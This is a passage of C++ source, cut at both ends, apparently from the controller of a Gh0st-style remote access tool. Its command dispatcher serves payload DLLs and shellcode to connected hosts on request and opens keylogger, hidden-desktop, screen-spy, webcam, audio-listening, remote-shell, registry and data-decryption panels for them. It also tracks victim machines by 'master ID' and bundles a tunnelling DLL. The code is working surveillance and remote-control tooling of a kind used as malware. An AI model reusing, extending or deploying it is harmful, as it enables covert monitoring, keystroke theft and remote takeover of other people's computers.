		size_t len = strlen(p);
		if (len > 0)
		{
			paths.emplace_back(p, len);
		}
		p += len + 1;
	}

	return paths;
}

VOID CMy2015RemoteDlg::MessageHandle(CONTEXT_OBJECT* ContextObject)
{
    if (isClosed) {
        return;
    }
    clock_t tick = clock();
    unsigned cmd = ContextObject->InDeCompressedBuffer.GetBYTE(0);
    LPBYTE szBuffer = ContextObject->InDeCompressedBuffer.GetBuffer();
    unsigned len = ContextObject->InDeCompressedBuffer.GetBufferLen();
    // 【L】：主机上下线和授权
    // 【x】：对话框相关功能
    switch (cmd) {
    case TOKEN_CLIENT_MSG: {
        ClientMsg *msg =(ClientMsg*)ContextObject->InDeCompressedBuffer.GetBuffer(0);
        PostMessageA(WM_SHOWERRORMSG, (WPARAM)new CString(msg->text), (LPARAM)new CString(msg->title));
        break;
    }
    case TOKEN_AUTH: {
        BOOL valid = FALSE;
        if (len > 20) {
            std::string sn(szBuffer + 1, szBuffer + 20); // length: 19
            std::string passcode(szBuffer + 20, szBuffer + 62); // length: 42
            uint64_t hmac = len > 64 ? *((uint64_t*)(szBuffer+62)) : 0;
            auto v = splitString(passcode, '-');
            if (v.size() == 6 || v.size() == 7) {
                std::vector<std::string> subvector(v.end() - 4, v.end());
                std::string password = v[0] + " - " + v[1] + ": " + GetPwdHash() + (v.size() == 6 ? "" : ": " + v[2]);
                std::string finalKey = deriveKey(password, sn);
                std::string hash256 = joinString(subvector, '-');
                std::string fixedKey = getFixedLengthID(finalKey);
                valid = (hash256 == fixedKey);
            }
            if (valid) {
				valid = AuthorizeClient(sn, passcode, hmac);
                if (valid) {
                    Mprintf("%s 校验成功, HMAC 校验成功: %s\n", passcode.c_str(), sn.c_str());
                    std::string tip = passcode + " 校验成功: " + sn;
                    CharMsg* msg = new CharMsg(tip.c_str());
                    PostMessageA(WM_SHOWMESSAGE, (WPARAM)msg, NULL);
                } else {
                    Mprintf("%s 校验成功, HMAC 校验失败: %s\n", passcode.c_str(), sn.c_str());
                }
            } else {
                Mprintf("%s 校验失败: %s\n", passcode.c_str(), sn.c_str());
            }
        } else {
            Mprintf("授权数据长度不足: %u\n", len);
        }
        char resp[100] = { valid };
        const char* msg = valid ? "此程序已获授权，请遵守授权协议，感谢合作" : "未获授权或消息哈希校验失败";
        memcpy(resp + 4, msg, strlen(msg));
        ContextObject->Send2Client((PBYTE)resp, sizeof(resp));
        break;
    }
    case COMMAND_GET_FILE: {
        // 发送文件
		std::string dir = (char*)(szBuffer + 1);
		char* ptr = (char*)szBuffer + 1 + dir.length() + 1;
        auto md5 = CalcMD5FromBytes((BYTE*)ptr, len - 2 - dir.length());
        if (!m_CmdList.PopCmd(md5)) {
            Mprintf("【警告】文件传输指令非法或已过期: %s\n", md5.c_str());
            ContextObject->CancelIO();
            break;
        }
        auto files = *ptr ? ParseMultiStringPath(ptr, len - 2 - dir.length()) : std::vector<std::string>{};
        if (!files.empty()) {
            std::string hash = GetPwdHash(), hmac = GetHMAC(100);
            std::thread(FileBatchTransferWorker, files, dir, ContextObject, SendData, FinishSend,
                        hash, hmac).detach();
        } else {
            ContextObject->CancelIO();
        }
        break;
    }
    case COMMAND_SEND_FILE: {
        // 接收文件
        std::string hash = GetPwdHash(), hmac = GetHMAC(100);
        CONNECT_ADDRESS addr;
        memcpy(addr.pwdHash, hash.c_str(), min(hash.length(), sizeof(addr.pwdHash)));
        int n = RecvFileChunk((char*)szBuffer, len, &addr, RecvData, hash, hmac);
        if (n) {
            Mprintf("RecvFileChunk failed: %d. hash: %s, hmac: %s\n", n, hash.c_str(), hmac.c_str());
        }
        break;
    }
    case TOKEN_GETVERSION: { // 获取版本【L】
        // TODO 维持心跳
        bool is64Bit = ContextObject->InDeCompressedBuffer.GetBYTE(1);
        Buffer* bin = m_ServerBin[is64Bit ? PAYLOAD_DLL_X64 : PAYLOAD_DLL_X86];
        DllSendData dll = { TASK_MAIN, L"ServerDll.dll", is64Bit, bin->length()-6 };
        BYTE *resp = new BYTE[1 + sizeof(DllSendData) + dll.DataSize];
        resp[0] = 0;
        memcpy(resp+1, &dll, sizeof(DllSendData));
        memcpy(resp+1+sizeof(DllSendData), bin->c_str() + 6, dll.DataSize);
        ContextObject->Send2Client(resp, 1 + sizeof(DllSendData) + dll.DataSize);
        SAFE_DELETE_ARRAY(resp);
        break;
    }
    case CMD_AUTHORIZATION: { // 获取授权【L】
        int n = ContextObject->InDeCompressedBuffer.GetBufferLength();
        if (n < 100) break;
        char resp[100] = { 0 }, *devId = resp + 5, *pwdHash = resp + 32;
        ContextObject->InDeCompressedBuffer.CopyBuffer(resp, min(n, sizeof(resp)), 0);
        unsigned short* days = (unsigned short*)(resp + 1);
        unsigned short* num = (unsigned short*)(resp + 3);
        BYTE msg[12] = {};
        memcpy(msg, resp, 5);
        memcpy(msg+8, resp+96, 4);
        uint32_t now = clock();
        uint32_t tm = *(uint32_t*)(resp + 96);
        if (now < tm || now - tm > 30000) {
            Mprintf("Get authorization timeout[%s], devId: %s, pwdHash:%s", ContextObject->PeerName.c_str(),
                    devId, pwdHash);
            break;
        }
        uint64_t signature = *(uint64_t*)(resp + 24);
        if (devId[0] == 0 || pwdHash[0] == 0 || !VerifyMessage(m_superPass, msg, sizeof(msg), signature)) {
            Mprintf("Get authorization failed[%s], devId: %s, pwdHash:%s\n", ContextObject->PeerName.c_str(),
                    devId, pwdHash);
            break;
        }
        char hostNum[10] = {};
        sprintf(hostNum, "%04d", *num);
        // 密码形式：20250209 - 20350209: SHA256: HostNum
        std::string hash = std::string(pwdHash, pwdHash+64);
        std::string password = getDateStr(0) + " - " + getDateStr(*days) + ": " + hash + ": " + hostNum;
        std::string finalKey = deriveKey(password, std::string(devId, devId+19));
        std::string fixedKey = getDateStr(0) + std::string("-") + getDateStr(*days) + "-" + hostNum +
                               std::string("-") + getFixedLengthID(finalKey);
        memcpy(devId, fixedKey.c_str(), fixedKey.length());
        devId[fixedKey.length()] = 0;
        std::string hmac = genHMAC(hash, m_superPass);
        memcpy(resp + 64, hmac.c_str(), hmac.length());
        resp[80] = 0;
        ContextObject->Send2Client((LPBYTE)resp, sizeof(resp));
        Sleep(20);
        break;
    }
    case CMD_EXECUTE_DLL: { // 请求DLL（执行代码）【L】
    case CMD_EXECUTE_DLL_NEW:
        DllExecuteInfo *info = (DllExecuteInfo*)ContextObject->InDeCompressedBuffer.GetBuffer(1);
        if (std::string(info->Name) == TINY_DLL_NAME) {
            auto tinyRun = ReadTinyRunDll(info->Pid);
            Buffer* buf = tinyRun->Data;
            ContextObject->Send2Client(buf->Buf(), tinyRun->Data->length());
            SAFE_DELETE(tinyRun);
            break;
        }
        else if (std::string(info->Name) == FRPC_DLL_NAME) {
			auto frpc = ReadFrpcDll();
			Buffer* buf = frpc->Data;
			ContextObject->Send2Client(buf->Buf(), frpc->Data->length());
			SAFE_DELETE(frpc);
			break;
        }
        for (std::vector<DllInfo*>::const_iterator i=m_DllList.begin(); i!=m_DllList.end(); ++i) {
            DllInfo* dll = *i;
            if (dll->Name == info->Name) {
                // TODO 如果是UDP，发送大包数据基本上不可能成功
                ContextObject->Send2Client(dll->Data->Buf(), dll->Data->length());
                break;
            }
        }
        auto dll = ReadPluginDll(PluginPath() + "\\" + info->Name, { SHELLCODE, 0, CALLTYPE_DEFAULT, {}, {}, info->Pid, info->Is32Bit });
        if (dll) {
            Buffer* buf = dll->Data;
            ContextObject->Send2Client(buf->Buf(), dll->Data->length());
            SAFE_DELETE(dll);
        }
        Sleep(20);
        break;
    }
    case COMMAND_PROXY: { // 代理映射【x】
        g_2015RemoteDlg->SendMessage(WM_OPENPROXYDIALOG, 0, (LPARAM)ContextObject);
        break;
    }
    case TOKEN_HEARTBEAT:
    case 137: // 心跳【L】
        g_2015RemoteDlg->PostMessageA(WM_UPDATE_ACTIVEWND, 0, (LPARAM)ContextObject);
        break;
    case SOCKET_DLLLOADER: {// 请求DLL【L】
        auto len = ContextObject->InDeCompressedBuffer.GetBufferLength();
        bool is64Bit = len > 1 ? ContextObject->InDeCompressedBuffer.GetBYTE(1) : false;
        int typ = (len > 2 ? ContextObject->InDeCompressedBuffer.GetBYTE(2) : MEMORYDLL);
        bool isRelease = len > 3 ? ContextObject->InDeCompressedBuffer.GetBYTE(3) : true;
        char version[12] = {};
        ContextObject->InDeCompressedBuffer.CopyBuffer(version, 12, 4);
        BOOL send = SendServerDll(ContextObject, typ==MEMORYDLL, is64Bit);
        Mprintf("'%s' Request %s [is64Bit:%d isRelease:%d] SendServerDll: %s\n", ContextObject->RemoteAddr().c_str(),
                typ == SHELLCODE ? "SC" : "DLL", is64Bit, isRelease, send ? "Yes" : "No");
        break;
    }
    case COMMAND_BYE: { // 主机下线【L】
        CancelIo((HANDLE)ContextObject->sClientSocket);
        closesocket(ContextObject->sClientSocket);
        Sleep(10);
        break;
    }
    case TOKEN_DRAWING_BOARD: { // 远程画板【x】
        g_2015RemoteDlg->SendMessage(WM_OPENDRAWINGBOARD, 0, (LPARAM)ContextObject);
        break;
    }
    case TOKEN_DRIVE_LIST_PLUGIN: { // 文件管理【x】
        g_2015RemoteDlg->SendMessage(WM_OPENFILEMGRDIALOG, 0, (LPARAM)ContextObject);
        break;
    }
    case TOKEN_BITMAPINFO_HIDE: { // 虚拟桌面【x】
        g_2015RemoteDlg->SendMessage(WM_OPENHIDESCREENDLG, 0, (LPARAM)ContextObject);
        break;
    }
    case TOKEN_SYSINFOLIST: { // 主机管理【x】
        g_2015RemoteDlg->SendMessage(WM_OPENMACHINEMGRDLG, 0, (LPARAM)ContextObject);
        break;
    }
    case TOKEN_CHAT_START: { // 远程交谈【x】
        g_2015RemoteDlg->SendMessage(WM_OPENCHATDIALOG, 0, (LPARAM)ContextObject);
        break;
    }
    case TOKEN_DECRYPT: { // 解密数据【x】
        g_2015RemoteDlg->SendMessage(WM_OPENDECRYPTDIALOG, 0, (LPARAM)ContextObject);
        break;
    }
    case TOKEN_KEYBOARD_START: {// 键盘记录【x】
        g_2015RemoteDlg->SendMessage(WM_OPENKEYBOARDDIALOG, 0, (LPARAM)ContextObject);
        break;
    }
    case TOKEN_LOGIN: { // 上线包【L】
        g_2015RemoteDlg->SendMessage(WM_USERTOONLINELIST, 0, (LPARAM)ContextObject);
        break;
    }
    case TOKEN_BITMAPINFO: { // 远程桌面【x】
        g_2015RemoteDlg->SendMessage(WM_OPENSCREENSPYDIALOG, 0, (LPARAM)ContextObject);
        break;
    }
    case TOKEN_DRIVE_LIST: { // 文件管理【x】
        g_2015RemoteDlg->SendMessage(WM_OPENFILEMANAGERDIALOG, 0, (LPARAM)ContextObject);
        break;
    }
    case TOKEN_TALK_START: { // 发送消息【x】
        g_2015RemoteDlg->SendMessage(WM_OPENTALKDIALOG, 0, (LPARAM)ContextObject);
        break;
    }
    case TOKEN_SHELL_START: { // 远程终端【x】
        g_2015RemoteDlg->SendMessage(WM_OPENSHELLDIALOG, 0, (LPARAM)ContextObject);
        break;
    }
    case TOKEN_WSLIST:  // 窗口管理【x】
    case TOKEN_PSLIST: { // 进程管理【x】
        g_2015RemoteDlg->SendMessage(WM_OPENSYSTEMDIALOG, 0, (LPARAM)ContextObject);
        break;
    }
    case TOKEN_AUDIO_START: { // 语音监听【x】
        g_2015RemoteDlg->SendMessage(WM_OPENAUDIODIALOG, 0, (LPARAM)ContextObject);
        break;
    }
    case TOKEN_REGEDIT: { // 注册表管理【x】
        g_2015RemoteDlg->SendMessage(WM_OPENREGISTERDIALOG, 0, (LPARAM)ContextObject);
        break;
    }
    case TOKEN_SERVERLIST: { // 服务管理【x】
        g_2015RemoteDlg->SendMessage(WM_OPENSERVICESDIALOG, 0, (LPARAM)ContextObject);
        break;
    }
    case TOKEN_WEBCAM_BITMAPINFO: { // 摄像头【x】
        g_2015RemoteDlg->SendMessage(WM_OPENWEBCAMDIALOG, 0, (LPARAM)ContextObject);
        break;
    }
    case CMD_PADDING: { // 随机填充
        Mprintf("Receive padding command '%s' [%d]: Len=%d\n", ContextObject->PeerName.c_str(), cmd, len);
        break;
    }
    default: {
        Mprintf("Receive unknown command '%s' [%d]: Len=%d\n", ContextObject->PeerName.c_str(), cmd, len);
    }
    }
    auto duration = clock() - tick;
    if (duration > 100) {
        Mprintf("[%s] Command '%s' [%d] cost %d ms\n", __FUNCTION__, ContextObject->PeerName.c_str(), cmd, duration);
    }
}

LRESULT CMy2015RemoteDlg::OnUserToOnlineList(WPARAM wParam, LPARAM lParam)
{
    CString strIP,  strAddr,  strPCName, strOS, strCPU, strVideo, strPing;
    CONTEXT_OBJECT* ContextObject = (CONTEXT_OBJECT*)lParam; //注意这里的  ClientContext  正是发送数据时从列表里取出的数据

    if (ContextObject == NULL || isClosed) {
        return -1;
    }

    try {
        strIP = ContextObject->GetPeerName().c_str();
        // 不合法的数据包
        if (ContextObject->InDeCompressedBuffer.GetBufferLength() < sizeof(LOGIN_INFOR)) {
            Mprintf("*** Received [%s] invalid login data! ***\n", strIP.GetString());
            return -1;
        }

        LOGIN_INFOR* LoginInfor = new LOGIN_INFOR;
        ContextObject->InDeCompressedBuffer.CopyBuffer((LPBYTE)LoginInfor, sizeof(LOGIN_INFOR), 0);

        auto curID = GetMasterId();
        ContextObject->bLogin = (LoginInfor->szMasterID == curID || strlen(LoginInfor->szMasterID)==0);
        if (!ContextObject->bLogin) {
            Mprintf("*** Received master '%s' client! ***\n", LoginInfor->szMasterID);
        }

        //主机名称
        strPCName = LoginInfor->szPCName;

        //版本信息
        strOS = LoginInfor->OsVerInfoEx;

        //CPU
        if (LoginInfor->dwCPUMHz != -1) {
            strCPU.Format("%dMHz", LoginInfor->dwCPUMHz);
        } else {
            strCPU = "Unknown";
        }

        //网速
        strPing.Format("%d", LoginInfor->dwSpeed);

        strVideo = m_settings.DetectSoftware ? "无" : LoginInfor->bWebCamIsExist ? "有" : "无";

        strAddr.Format("%d", ContextObject->GetPort());
        auto v = LoginInfor->ParseReserved(RES_MAX);
        AddList(strIP,strAddr,strPCName,strOS,strCPU,strVideo,strPing,LoginInfor->moduleVersion,LoginInfor->szStartTime, v, ContextObject);
        delete LoginInfor;
        return S_OK;
    } catch(...) {
        Mprintf("[ERROR] OnUserToOnlineList catch an error: %s\n", ContextObject->GetPeerName().c_str());
    }
    return -1;
}


LRESULT CMy2015RemoteDlg::OnUserOfflineMsg(WPARAM wParam, LPARAM lParam)
{
    auto host = FindHost((int)lParam);
    if (host) {
        CLock L(m_cs);
        m_HostList.erase(host);
    }
    DialogBase* p = (DialogBase*)wParam;
    if (p && ::IsWindow(p->GetSafeHwnd()) && p->ShouldReconnect()) {
        ::PostMessageA(p->GetSafeHwnd(), WM_DISCONNECT, 0, 0);
        return S_OK;
    }

    CString ip, port;
    port.Format("%d", lParam);
    EnterCriticalSection(&m_cs);
    int n = m_CList_Online.GetItemCount();
    for (int i = 0; i < n; ++i) {
        CString cur = m_CList_Online.GetItemText(i, ONLINELIST_ADDR);
        if (cur == port) {
            ip = m_CList_Online.GetItemText(i, ONLINELIST_IP);
            auto ctx = (context*)m_CList_Online.GetItemData(i);
            m_CList_Online.DeleteItem(i);
            m_HostList.erase(ctx);
            auto tm = ctx->GetAliveTime();
            std::string aliveInfo = tm>=86400 ? floatToString(tm / 86400.f) + " d" :
                                    tm >= 3600 ? floatToString(tm / 3600.f) + " h" :
                                    tm >= 60 ? floatToString(tm / 60.f) + " m" : floatToString(tm) + " s";
            ShowMessage("操作成功", ip + "主机下线[" + aliveInfo.c_str() + "]");
            break;
        }
    }
    LeaveCriticalSection(&m_cs);

    if (p && ::IsWindow(p->GetSafeHwnd())) {
        ::PostMessageA(p->GetSafeHwnd(), WM_CLOSE, 0, 0);
    }

    return S_OK;
}

LRESULT CMy2015RemoteDlg::UpdateUserEvent(WPARAM wParam, LPARAM lParam)
{
    CONTEXT_OBJECT* ctx = (CONTEXT_OBJECT*)lParam;
    UpdateActiveWindow(ctx);

    return S_OK;
}

void CMy2015RemoteDlg::UpdateActiveWindow(CONTEXT_OBJECT* ctx)
{
    auto host = FindHost(ctx);
    if (!host) {
        // TODO: 不要简单地主动关闭连接
        ctx->CancelIO();
        Mprintf("UpdateActiveWindow failed: %s \n", ctx->GetPeerName().c_str());
        return;
    }

    Heartbeat hb;
    ctx->InDeCompressedBuffer.CopyBuffer(&hb, sizeof(Heartbeat), 1);

    // 回复心跳
    // if(0)
    {
		BOOL authorized = AuthorizeClient(hb.SN, hb.Passcode, hb.PwdHmac);
		if (authorized) {
			Mprintf("%s HMAC 校验成功: %lld\n", hb.Passcode, hb.PwdHmac);
			std::string tip = std::string(hb.Passcode) + " 授权成功: ";
			tip += std::to_string(hb.PwdHmac) + "[" + std::string(ctx->GetClientData(ONLINELIST_IP)) + "]";
			CharMsg* msg = new CharMsg(tip.c_str());
			PostMessageA(WM_SHOWMESSAGE, (WPARAM)msg, NULL);
		}
        HeartbeatACK ack = { hb.Time, (char)authorized };
        BYTE buf[sizeof(HeartbeatACK) + 1] = { CMD_HEARTBEAT_ACK};
        memcpy(buf + 1, &ack, sizeof(HeartbeatACK));
        ctx->Send2Client(buf, sizeof(buf));
    }

    CLock L(m_cs);
    int n = m_CList_Online.GetItemCount();
    context* cur = (context*)ctx;
    for (int i = 0; i < n; ++i) {
        context* id = (context*)m_CList_Online.GetItemData(i);
        if (cur->IsEqual(id)) {
            m_CList_Online.SetItemText(i, ONLINELIST_LOGINTIME, hb.ActiveWnd);
            if (hb.Ping > 0)
                m_CList_Online.SetItemText(i, ONLINELIST_PING, std::to_string(hb.Ping).c_str());
            m_CList_Online.SetItemText(i, ONLINELIST_VIDEO, hb.HasSoftware ? "有" : "无");
            return;
        }
    }
}

context* CMy2015RemoteDlg::FindHost(context* ctx)
{
    CLock L(m_cs);
    for (auto i = m_HostList.begin(); i != m_HostList.end(); ++i) {
        if (ctx->IsEqual(*i)) {
            return ctx;
        }
    }
    return NULL;
}

context* CMy2015RemoteDlg::FindHost(int port)
{
    CLock L(m_cs);
    for (auto i = m_HostList.begin(); i != m_HostList.end(); ++i) {
        if ((*i)->GetPort() == port) {
            return *i;
        }
    }
    return NULL;
}

context* CMy2015RemoteDlg::FindHost(uint64_t id)
{
    CLock L(m_cs);
    for (auto i = m_HostList.begin(); i != m_HostList.end(); ++i) {
        if ((*i)->GetClientID() == id) {
            return *i;
        }
    }
    return NULL;
}

void CMy2015RemoteDlg::SendMasterSettings(CONTEXT_OBJECT* ctx)
{
    BYTE buf[sizeof(MasterSettings) + 1] = { CMD_MASTERSETTING };
    memcpy(buf+1, &m_settings, sizeof(MasterSettings));

    if (ctx) {
        ctx->Send2Client(buf, sizeof(buf));
    } else {
        EnterCriticalSection(&m_cs);
        for (auto i = m_HostList.begin(); i != m_HostList.end(); ++i) {
            context* ContextObject = *i;
            if (!ContextObject->IsLogin())
                continue;
            ContextObject->Send2Client(buf, sizeof(buf));
        }
        LeaveCriticalSection(&m_cs);
    }
}

bool isAllZeros(const BYTE* data, int len)
{
    for (int i = 0; i < len; ++i)
        if (data[i])
            return false;
    return true;
}

BOOL CMy2015RemoteDlg::SendServerDll(CONTEXT_OBJECT* ContextObject, bool isDLL, bool is64Bit)
{
    auto id = is64Bit ? PAYLOAD_DLL_X64 : PAYLOAD_DLL_X86;
    auto buf = isDLL ? m_ServerDLL[id] : m_ServerBin[id];
    if (buf->length()) {
        // 只有发送了IV的加载器才支持AES加密
        int len = ContextObject->InDeCompressedBuffer.GetBufferLength();
        bool hasIV = len >= 32 && !isAllZeros(ContextObject->InDeCompressedBuffer.GetBuffer(16), 16);
        char md5[33] = {};
        memcpy(md5, (char*)ContextObject->InDeCompressedBuffer.GetBuffer(32), max(0,min(32, len-32)));
        if (!buf->MD5().empty() && md5 != buf->MD5()) {
            ContextObject->Send2Client(buf->Buf(), buf->length(!hasIV));
            return TRUE;
        } else {
            ContextObject->Send2Client( buf->Buf(), 6 /* data not changed */);
        }
    }
    return FALSE;
}


LRESULT CMy2015RemoteDlg::OnOpenScreenSpyDialog(WPARAM wParam, LPARAM lParam)
{
    CONTEXT_OBJECT* ContextObject = (CONTEXT_OBJECT*)lParam;
    LPBYTE p = ContextObject->InDeCompressedBuffer.GetBuffer(41);
    LPBYTE q = ContextObject->InDeCompressedBuffer.GetBuffer(49);
    uint64_t clientID = p ? *((uint64_t*)p) : 0;
    uint64_t dlgID = q ? *((uint64_t*)q) : 0;
    auto mainCtx = clientID ? FindHost(clientID) : NULL;
    CDialogBase* dlg = dlgID ? (DialogBase*)dlgID : NULL;
    if (mainCtx) ContextObject->SetPeerName(mainCtx->GetClientData(ONLINELIST_IP).GetString());
    if (dlg) {
        if (GetRemoteWindow(dlg))
            return dlg->UpdateContext(ContextObject);
        Mprintf("收到远程桌面打开消息, 对话框已经销毁: %lld\n", dlgID);
    }
    return OpenDialog<CScreenSpyDlg, IDD_DIALOG_SCREEN_SPY, SW_SHOWMAXIMIZED>(wParam, lParam);
}

LRESULT CMy2015RemoteDlg::OnOpenFileManagerDialog(WPARAM wParam, LPARAM lParam)
{
    return OpenDialog<CFileManagerDlg, IDD_FILE>(wParam, lParam);
}

LRESULT CMy2015RemoteDlg::OnOpenTalkDialog(WPARAM wParam, LPARAM lParam)
{
    return OpenDialog<CTalkDlg, IDD_DIALOG_TALK>(wParam, lParam);
}

LRESULT CMy2015RemoteDlg::OnOpenShellDialog(WPARAM wParam, LPARAM lParam)
{
    return OpenDialog<CShellDlg, IDD_DIALOG_SHELL>(wParam, lParam);
}


LRESULT CMy2015RemoteDlg::OnOpenSystemDialog(WPARAM wParam, LPARAM lParam)
{
    return OpenDialog<CSystemDlg, IDD_DIALOG_SYSTEM>(wParam, lParam);
}

LRESULT CMy2015RemoteDlg::OnOpenAudioDialog(WPARAM wParam, LPARAM lParam)
{
    return OpenDialog<CAudioDlg, IDD_DIALOG_AUDIO>(wParam, lParam);
}

LRESULT CMy2015RemoteDlg::OnOpenServicesDialog(WPARAM wParam, LPARAM lParam)
{
    return OpenDialog<CServicesDlg, IDD_DIALOG_SERVICES>(wParam, lParam);
}

LRESULT CMy2015RemoteDlg::OnOpenRegisterDialog(WPARAM wParam, LPARAM lParam)
{
    return OpenDialog<CRegisterDlg, IDD_DIALOG_REGISTER>(wParam, lParam);
}

LRESULT CMy2015RemoteDlg::OnOpenVideoDialog(WPARAM wParam, LPARAM lParam)
{
    return OpenDialog<CVideoDlg, IDD_DIALOG_VIDEO>(wParam, lParam);
}

LRESULT CMy2015RemoteDlg::OnOpenKeyboardDialog(WPARAM wParam, LPARAM lParam)
{
    return OpenDialog<CKeyBoardDlg, IDD_DLG_KEYBOARD>(wParam, lParam);
}

LRESULT CMy2015RemoteDlg::OnOpenProxyDialog(WPARAM wParam, LPARAM lParam)
{
    return OpenDialog<CProxyMapDlg, IDD_PROXY>(wParam, lParam);
}

LRESULT CMy2015RemoteDlg::OnOpenHideScreenDialog(WPARAM wParam, LPARAM lParam)
{
    return OpenDialog<CHideScreenSpyDlg, IDD_SCREEN>(wParam, lParam);
}

LRESULT CMy2015RemoteDlg::OnOpenMachineManagerDialog(WPARAM wParam, LPARAM lParam)
{
    return OpenDialog<CMachineDlg, IDD_MACHINE>(wParam, lParam);
}

LRESULT CMy2015RemoteDlg::OnOpenChatDialog(WPARAM wParam, LPARAM lParam)
{
    return OpenDialog<CChat, IDD_CHAT>(wParam, lParam);
}

LRESULT CMy2015RemoteDlg::OnOpenDecryptDialog(WPARAM wParam, LPARAM lParam)
{
    return OpenDialog<DecryptDlg, IDD_DIALOG_DECRYPT>(wParam, lParam);
}

LRESULT CMy2015RemoteDlg::OnOpenFileMgrDialog(WPARAM wParam, LPARAM lParam)
{
    return OpenDialog<file::CFileManagerDlg, IDD_FILE_WINOS>(wParam, lParam);
}

LRESULT CMy2015RemoteDlg::OnOpenDrawingBoard(WPARAM wParam, LPARAM lParam)
{
    return OpenDialog<CDrawingBoard, IDD_DRAWING_BOARD>(wParam, lParam);
}

BOOL CMy2015RemoteDlg::OnHelpInfo(HELPINFO* pHelpInfo)
{
    OnAbout();
    return TRUE;
}


BOOL CMy2015RemoteDlg::PreTranslateMessage(MSG* pMsg)
{
    if (pMsg->message == WM_KEYDOWN && pMsg->wParam == VK_RETURN) {
        return TRUE;
    }

    if ((pMsg->message == WM_LBUTTONDOWN || pMsg->message == WM_RBUTTONDOWN) && m_pFloatingTip) {
        HWND hTipWnd = m_pFloatingTip->GetSafeHwnd();
        if (::IsWindow(hTipWnd)) {
            CPoint pt(pMsg->pt);
            CRect tipRect;
            ::GetWindowRect(hTipWnd, &tipRect);
            if (!tipRect.PtInRect(pt)) {
                DeletePopupWindow();
            }
        }
    }

    return CDialogEx::PreTranslateMessage(pMsg);
}

LRESULT CMy2015RemoteDlg::WindowProc(UINT message, WPARAM wParam, LPARAM lParam)
{
    // WM_COMMAND 不计时
    if (message == WM_COMMAND) {
        return CDialogEx::WindowProc(message, wParam, lParam);
    }

    auto start = std::chrono::steady_clock::now();

    LRESULT result = CDialogEx::WindowProc(message, wParam, lParam);

    auto ms = std::chrono::duration_cast<std::chrono::milliseconds>(
                  std::chrono::steady_clock::now() - start).count();

    if (ms > m_TraceTime) {
        if (message >= WM_USER) {
            Mprintf("[BLOCKED] WM_USER + %d 阻塞: %lld ms\n", message - WM_USER, ms);
        } else {
            Mprintf("[BLOCKED] MSG 0x%04X (%d) 阻塞: %lld ms\n", message, message, ms);
        }
    }

    return result;
}

void CMy2015RemoteDlg::OnOnlineShare()
{
    CInputDialog dlg(this);
    dlg.Init("分享主机", "输入<IP:PORT>地址:");
    if (dlg.DoModal() != IDOK || dlg.m_str.IsEmpty())
        return;
    if (dlg.m_str.GetLength() >= 250) {
        MessageBox("字符串长度超出[0, 250]范围限制!", "提示", MB_ICONINFORMATION);
        return;
    }
    CharMsg* buf = new CharMsg(dlg.m_str.GetLength()+1);
    memcpy(buf->data, dlg.m_str, dlg.m_str.GetLength());
    buf->data[dlg.m_str.GetLength()] = 0;
    PostMessageA(WM_SHARE_CLIENT, (WPARAM)buf, NULL);
}

LRESULT CMy2015RemoteDlg::ShareClient(WPARAM wParam, LPARAM lParam)
{
    CharMsg* buf = (CharMsg*)wParam;
    int len = strlen(buf->data);
    BYTE bToken[_MAX_PATH] = { COMMAND_SHARE };
    // 目标主机类型
    bToken[1] = SHARE_TYPE_YAMA;
    memcpy(bToken + 2, buf->data, len);
    lParam ? SendAllCommand(bToken, sizeof(bToken)) : SendSelectedCommand(bToken, sizeof(bToken));
    if(buf->needFree) delete buf;
    return S_OK;
}

void CMy2015RemoteDlg::OnToolAuth()
{
    CPwdGenDlg dlg;
    std::string hardwareID = GetHardwareID();
    std::string hashedID = hashSHA256(hardwareID);
    std::string deviceID = getFixedLengthID(hashedID);
    dlg.m_sDeviceID = deviceID.c_str();
    dlg.m_sUserPwd = m_superPass.c_str();

    dlg.DoModal();

    if (!dlg.m_sUserPwd.IsEmpty() && !dlg.m_sPassword.IsEmpty()) {
        m_superPass = dlg.m_sUserPwd;
        if (deviceID.c_str() == dlg.m_sDeviceID) {
            m_nMaxConnection = dlg.m_nHostNum;
            THIS_APP->UpdateMaxConnection(m_nMaxConnection);
        }
    }
}

void CMy2015RemoteDlg::OnMainProxy()
{
    EnterCriticalSection(&m_cs);
    POSITION Pos = m_CList_Online.GetFirstSelectedItemPosition();
    while (Pos) {
        int	iItem = m_CList_Online.GetNextSelectedItem(Pos);
        context* ContextObject = (context*)m_CList_Online.GetItemData(iItem);
        BYTE cmd[] = { COMMAND_PROXY };
        ContextObject->Send2Client( cmd, sizeof(cmd));
        break;
    }
    LeaveCriticalSection(&m_cs);
}

void CMy2015RemoteDlg::OnOnlineHostnote()
{
    CInputDialog dlg(this);
    dlg.Init("修改备注", "请输入主机备注: ");
    if (dlg.DoModal() != IDOK || dlg.m_str.IsEmpty()) {
        return;
    }
    if (dlg.m_str.GetLength() >= 64) {
        MessageBox("备注信息长度不能超过64个字符", "提示", MB_ICONINFORMATION);
        dlg.m_str = dlg.m_str.Left(63);
    }
    BOOL modified = FALSE;
    uint64_t key = 0;
    EnterCriticalSection(&m_cs);
    POSITION Pos = m_CList_Online.GetFirstSelectedItemPosition();
    while (Pos) {
        int	iItem = m_CList_Online.GetNextSelectedItem(Pos);
        context* ContextObject = (context*)m_CList_Online.GetItemData(iItem);
        auto f = m_ClientMap.find(ContextObject->GetClientID());
        if (f == m_ClientMap.end())
            m_ClientMap[ContextObject->GetClientID()] = ClientValue("", dlg.m_str);
        else
            m_ClientMap[ContextObject->GetClientID()].UpdateNote(dlg.m_str);
        m_CList_Online.SetItemText(iItem, ONLINELIST_COMPUTER_NAME, dlg.m_str);
        modified = TRUE;
    }
    LeaveCriticalSection(&m_cs);
    if (modified) {
        EnterCriticalSection(&m_cs);
        SaveToFile(m_ClientMap, GetDbPath());
        LeaveCriticalSection(&m_cs);
    }
}


char* ReadFileToBuffer(const std::string &path, size_t& outSize)
{
    // 打开文件
    std::ifstream file(path, std::ios::binary | std::ios::ate); // ate = 跳到末尾获得大小
    if (!file) {
        return nullptr;
    }

    // 获取文件大小并分配内存
    std::streamsize size = file.tellg();
    file.seekg(0, std::ios::beg);
    char* buffer = new char[size];

    // 读取文件到 buffer
    if (!file.read(buffer, size)) {
        delete[] buffer;
        return nullptr;
    }

    outSize = static_cast<size_t>(size);
    return buffer;
}

//////////////////////////////////////////////////////////////////////////
// UPX

BOOL WriteBinaryToFile(const char* path, const char* data, ULONGLONG size, LONGLONG offset)
{
	std::string filePath = path;
	std::fstream outFile;

	if (offset == 0) {
		// offset=0 时截断文件，等同覆盖写入
		outFile.open(filePath, std::ios::binary | std::ios::out | std::ios::trunc);
	}
	else if (offset == -1) {
		// offset=-1 时追加写入
